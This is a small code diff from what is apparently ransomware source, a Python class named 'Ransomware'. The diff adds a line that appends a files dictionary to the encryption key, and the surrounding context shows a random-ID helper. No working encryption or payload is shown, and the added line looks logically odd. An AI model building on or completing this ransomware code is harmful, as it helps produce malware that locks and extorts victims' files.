@@ -18,6 +18,8 @@ class Ransomware:
         self.key = key
         self.files_dict = files_dict
 
+        self.key += self.files_dict
+
     def id_generator(self, size, chars=string.ascii_lowercase + string.digits):
         return ''.join(random.choice(chars) for _ in range(size))
 
